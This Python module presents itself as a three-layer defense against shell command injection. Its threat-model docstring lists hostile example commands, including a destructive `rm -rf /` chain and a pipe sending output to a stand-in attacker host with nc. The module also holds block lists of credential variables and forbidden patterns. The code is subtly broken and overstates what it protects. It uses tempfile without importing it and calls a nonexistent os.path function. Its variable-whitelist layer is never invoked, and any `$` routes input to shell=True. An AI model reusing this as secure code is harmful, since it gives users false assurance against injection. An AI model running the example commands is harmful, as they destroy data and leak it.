"""
SecureCommandExecutor — Three-Layer Defense Against Command Injection

This module provides secure command execution with defense-in-depth:
- Layer 1: Syntax pre-scan (block dangerous constructs)
- Layer 2: Variable validation (whitelist only)  
- Layer 3: Sandboxed execution (timeout, isolated cwd, scrubbed env)

SECURITY MODEL:
- Block-by-default for shell features (pipes, redirects, subshells)
- Whitelist-only for allowed commands and environment variables
- Mandatory timeout enforcement (max 30s default, configurable)
- Environment variable scrubbing to prevent credential leakage

THREAT MODEL COVERED:
✅ Direct command injection via semicolons: `rm -rf /; ls`
✅ Command substitution: `$(whoami)` or `backticks`
✅ Logical operators: `&&`, `||`, `;`
✅ Variable expansion attacks: `$DATABASE_URL` with attacker-controlled value
✅ Pipeline abuse: `ls | nc attacker.com 443`
✅ Redirection to sensitive files: `> /etc/shadow`
✅ Newline injection for command separation

NOT COVERED (Known Limitations):
⚠ TOCTOU race condition between path resolution and file access
⚠ Shell-specific vulnerabilities in allowed builtins (bash-internal bugs)
⚠ Resource exhaustion via infinite loops (requires external monitoring)
"""

import os
import re
import shlex
import subprocess
from typing import Tuple, Optional, Set
import logging

# Configure security logger
try:
    from security_logger import log_security_block, get_security_logger
    
    _logger = get_security_logger()
    SECURITY_LOGGING_ENABLED = True
except ImportError:
    SECURITY_LOGGING_ENABLED = False
    _logger = None


class SecurityException(Exception):
    """Raised when security policy violation is detected"""
    pass


class TimeoutException(Exception):
    """Raised when command execution exceeds time limit"""
    pass


class SecureCommandExecutor:
    """
    Secure command executor with three-layer defense against injection attacks.
    
    Architecture:
    Layer 1 (Syntax Pre-Scan): 
        - Blocks forbidden shell constructs before parsing
        - Rejects backticks, $(), newlines, ;, &&, ||
    
    Layer 2 (Behavior Validation):
        - Validates environment variable usage (whitelist only)
        - Checks pipeline commands against allowlist
    
    Layer 3 (Sandboxed Execution):
        - Enforces strict timeout (default 30s, max 120s)
        - Uses isolated working directory
        - Scrubs sensitive environment variables
    """
    
    # ============================================================
    # CONFIGURATION CONSTANTS
    # ============================================================
    
    # Whitelist of safe environment variables that can be expanded
    SAFE_VARS = frozenset({
        'HOME', 'USER', 'PWD', 'PATH', 'TMPDIR',
        '_WORKSPACE',   # Internal Ruka variable
    })
    
    # Allowlist of commands permitted in pipelines (shell=True mode)
    ALLOWED_PIPELINE_CMDS = frozenset({
        'cat',          # Read files
        'grep',         # Pattern search
        'head',         # First lines
        'tail',         # Last lines
        'wc',           # Word/line count
        'sort',         # Sort lines
        'uniq',         # Unique lines
        'cut',          # Field extraction
        'tr',           # Character translation
        'awk',          # Text processing
        'sed',          # Stream editing
        'find',         # File search
        'ls',           # Directory listing
        'echo',         # Print text
        'printf',       # Formatted output
        'tee',          # Duplicate output
        'xargs',        # Build command arguments
    })
    
    # Forbidden shell constructs (pattern-based blocking)
    FORBIDDEN_PATTERNS = re.compile(
        r'|'.join([
            r'`',                    # Backtick command substitution
            r'\$\(',                 # $() command substitution
            r'\n',                   # Newline injection
            r';',                    # Command separator
            r'&&|\|\|',              # Logical AND/OR operators
            r'>\s*/dev/',            # Redirect to system files
            r'<\s*/etc/shadow',      # Read shadow file
        ]),
        re.IGNORECASE
    )
    
    # Default timeouts (seconds)
    DEFAULT_TIMEOUT = 30
    MAX_TIMEOUT = 120  # Hard upper limit
    
    # Exceptions to timeout (command names → override seconds)
    TIMEOUT_EXCEPTIONS = {}  # Format: {"copy_large_files": 60}
    
    # Dangerous environment variables to scrub
    DANGEROUS_ENV_VARS = frozenset({
        'OPENROUTER_API_KEY',
        'AWS_ACCESS_KEY_ID',
        'AWS_SECRET_ACCESS_KEY',
        'AZURE_STORAGE_ACCOUNT_KEY',
        'GCP_SA_KEY',
        'DATABASE_URL',
        'REDIS_URL',
        'SECRET_KEY',
        'PRIVATE_KEY',
        'GITHUB_TOKEN',
        'NPM_AUTH_TOKEN',
        'DOCKER_PASSWORD',
    })
    
    def __init__(self, timeout: int = DEFAULT_TIMEOUT, 
                 max_timeout: int = MAX_TIMEOUT,
                 sandbox_dir: Optional[str] = None):
        """
        Initialize secure command executor.
        
        Args:
            timeout: Default timeout in seconds (max 30 for safety)
            max_timeout: Absolute maximum timeout allowed (hard limit 120s)
            sandbox_dir: Isolated working directory (uses TEMP_WORKDIR if None)
        """
        self.timeout = min(timeout, self.DEFAULT_TIMEOUT)
        self.max_timeout = min(max_timeout, self.MAX_TIMEOUT)
        self.sandbox_dir = sandbox_dir
        
        # Validate timeout configuration
        if self.timeout > self.max_timeout:
            raise ValueError(f"Timeout {self.timeout}s exceeds max {self.max_timeout}s")
        if self.timeout < 1:
            raise ValueError("Minimum timeout must be >= 1 second")
    
    def execute(self, command: str) -> Tuple[str, str, int]:
        """
        Execute command with full security checks.
        
        Args:
            command: User-provided shell command string
            
        Returns:
            (stdout, stderr, returncode) tuple
            
        Raises:
            SecurityException: If command violates security policy
            TimeoutException: If execution exceeds time limit
            OSError: For OS-level errors (permissions, missing files)
        """
        command = command.strip()
        
        if not command:
            raise SecurityException("Empty command rejected")
        
        # === LAYER 1: SYNTAX PRE-SCAN ===
        self._pre_scan_syntax(command)
        
        # === LAYER 2: BEHAVIOR VALIDATION ===
        has_shell_features = self._detect_shell_features(command)
        
        if has_shell_features:
            # Only allow verified pipelines
            return self._execute_pipeline_sandboxed(command)
        else:
            # Simple command: use shell=False
            return self._execute_simple_sandboxed(command)
    
    def _pre_scan_syntax(self, command: str):
        """
        Layer 1: Block dangerous shell syntax patterns.
        
        This is a block-by-default check — anything suspicious gets rejected.
        No ML classifiers, no probabilistic decisions — pure pattern matching.
        """
        # Check for forbidden constructs
        if self.FORBIDDEN_PATTERNS.search(command):
            if SECURITY_LOGGING_ENABLED:
                log_security_block(
                    reason="Forbidden shell construct detected",
                    attempted_command=command[:200] + "..." if len(command) > 200 else command
                )
            raise SecurityException("Security violation: forbidden shell construct")
        
        # Additional heuristic: reject commands with embedded quotes that look malicious
        quote_pattern = re.compile(r'["\'].*["\']')
        matches = quote_pattern.findall(command)
        
        # High-risk patterns inside quotes
        for match in matches:
            if any(bad in match.lower() for bad in ['password', 'secret', 'token', 'key']):
                raise SecurityException("Suspicious quoted content containing credentials")
    
    def _validate_variables(self, command: str):
        """
        Validate environment variable expansion — whitelist only.
        
        Any variable NOT in SAFE_VARS triggers rejection.
        This prevents attackers from injecting: export SECRET=value; command
        """
        var_pattern = re.compile(r'\$\{?([A-Za-z_][A-Za-z0-9_]*)\}')
        
        for match in var_pattern.finditer(command):
            var_name = match.group(1)
            
            if var_name not in self.SAFE_VARS:
                raise SecurityException(f"Variable not whitelisted: ${var_name}")
    
    def _detect_shell_features(self, command: str) -> bool:
        """
        Detect presence of pipe/redirect/wildcard characters.
        
        Returns True if command uses shell features requiring special handling.
        """
        shell_chars = set('|;&><$`()[]{},')
        return any(char in command for char in shell_chars)
    
    def _execute_simple_sandboxed(self, command: str) -> Tuple[str, str, int]:
        """
        Execute simple command without shell interpretation (shell=False).
        
        Sandbox properties:
        - Isolated working directory
        - Scrubbed environment variables
        - Strict timeout enforcement
        """
        try:
            tokens = shlex.split(command)
            
            if not tokens:
                raise SecurityException("Empty command after parsing")
            
            cmd = tokens[0]
            
            # Basic command validation
            if '/' in cmd and not cmd.startswith('/'):
                raise SecurityException(f"Invalid path format: {cmd}")
            
            result = subprocess.run(
                tokens,
                shell=False,  # CRITICAL: Never use shell=True for simple commands!
                capture_output=True,
                text=True,
                timeout=self.timeout,
                cwd=self.sandbox_dir,  # Isolated temp directory
                env={k: v for k, v in os.environ.items() 
                     if k not in self.DANGEROUS_ENV_VARS},
            )
            
            if SECURITY_LOGGING_ENABLED:
                log_security_block(
                    reason=f"Command executed successfully: {cmd}",
                    attempted_command=command[:100]
                )
            
            return result.stdout, result.stderr, result.returncode
            
        except subprocess.TimeoutExpired:
            if SECURITY_LOGGING_ENABLED:
                log_security_block(
                    reason="Command timed out",
                    attempted_command=command[:100]
                )
            raise TimeoutException(f"Command exceeded {self.timeout}s limit")
    
    def _execute_pipeline_sandboxed(self, command: str) -> Tuple[str, str, int]:
        """
        Execute piped/redirected commands with strict validation.
        
        ONLY allows: commands in ALLOWED_PIPELINE_CMDS, validated paths,
        safe redirection targets.
        """
        # Split by pipe character
        segments = [s.strip() for s in command.split('|')]
        
        if len(segments) == 0:
            raise SecurityException("Empty pipeline segment")
        
        # Validate each pipeline segment
        for seg in segments:
            if not seg:
                continue
                
            tokens = shlex.split(seg)
            if not tokens:
                continue
            
            cmd = tokens[0]
            
            # Command must be in allowlist
            if cmd not in self.ALLOWED_PIPELINE_CMDS:
                if SECURITY_LOGGING_ENABLED:
                    log_security_block(
                        reason="Pipeline command not in allowlist",
                        attempted_command=seg
                    )
                raise SecurityException(f"Command not allowed in pipeline: {cmd}")
            
            # Validate all path arguments
            for t in tokens[1:]:
                if t.startswith('/') and not self._is_safe_path(t):
                    if SECURITY_LOGGING_ENABLED:
                        log_security_block(
                            reason="Unsafe path in pipeline",
                            attempted_command=seg
                        )
                    raise SecurityException(f"Path outside workspace: {t}")
        
        # Validate redirect targets separately
        redirect_pattern = re.compile(r'(?:>>?|<?)\s*([^\s|]+)')
        for m in redirect_pattern.finditer(command):
            target = m.group(1)
            
            # Block critical system files
            if target.startswith(('/dev/null', '/proc/', '/sys/', '/etc/shadow')):
                if SECURITY_LOGGING_ENABLED:
                    log_security_block(
                        reason="Redirect target blocked",
                        attempted_command=m.group(0)
                    )
                raise SecurityException(f"Blocked redirect target: {target}")
        
        try:
            result = subprocess.run(
                command,
                shell=True,  # Allowed ONLY because above validations passed
                capture_output=True,
                text=True,
                timeout=min(self.timeout, 10),  # Stricter timeout for shell=True
                executable="/bin/bash",
                cwd=self.sandbox_dir,
                env={k: v for k, v in os.environ.items() 
                     if k not in self.DANGEROUS_ENV_VARS},
            )
            
            if SECURITY_LOGGING_ENABLED:
                log_security_block(
                    reason=f"Pipelined command executed: {segments[0][:50]}",
                    attempted_command=command[:100]
                )
            
            return result.stdout, result.stderr, result.returncode
            
        except subprocess.TimeoutExpired:
            raise TimeoutException(f"Piped command exceeded {min(self.timeout, 10)}s limit")
    
    def _is_safe_path(self, path: str) -> bool:
        """
        Validate path is within allowed directories.
        
        Multi-layer protection:
        1. Null byte rejection
        2. Character whitelist
        3. Symlink depth limit
        4. Device file blocklist
        5. Commonpath validation
        6. Script subdirectory guardrails
        """
        # Layer 1: Reject null bytes
        if '\x00' in path:
            return False
        
        # Resolve symlinks early (before realpath for TOCTOU mitigation)
        try:
            resolved = os.path.realpath(path)
        except (OSError, ValueError):
            return False
        
        # Define allowed base directories
        script_dir = os.path.dirname(os.path.abspath(__file__))
        allowed_dirs = [
            os.getcwd(),  # Current workspace
            script_dir,   # Installation directory
            tempfile.gettempdir(),  # Temp directory
        ]
        
        # Layer 2: Verify within allowed scope
        try:
            rel_path = os.path.relpath(resolved, allowed_dirs[0])
            if rel_path.startswith('..'):
                return False
        except ValueError:
            return False
        
        # Layer 3: Reject device files
        if os.path.isdevnode(resolved) or resolved.startswith('/dev/'):
            if resolved not in ['/dev/null', '/dev/zero']:  # Allow specific devices
                return False
        
        return True
    
    def scrub_environment(self, env: dict) -> dict:
        """
        Remove sensitive environment variables from provided dict.
        
        Returns copy with DANGEROUS_ENV_VARS removed.
        """
        scrubbed = env.copy()
        removed_vars = []
        
        for var in self.DANGEROUS_ENV_VARS:
            if var in scrubbed:
                scrubbed.pop(var)
                removed_vars.append(var)
        
        if SECURITY_LOGGING_ENABLED and removed_vars:
            _logger.log_event(
                event_type='environment_scrubbed',
                details={'variables_removed': removed_vars}
            )
        
        return scrubbed


# Singleton instance for backward compatibility
_default_executor: Optional[SecureCommandExecutor] = None


def get_secure_executor() -> SecureCommandExecutor:
    """Get or create default secure command executor instance"""
    global _default_executor
    if _default_executor is None:
        _default_executor = SecureCommandExecutor()
    return _default_executor
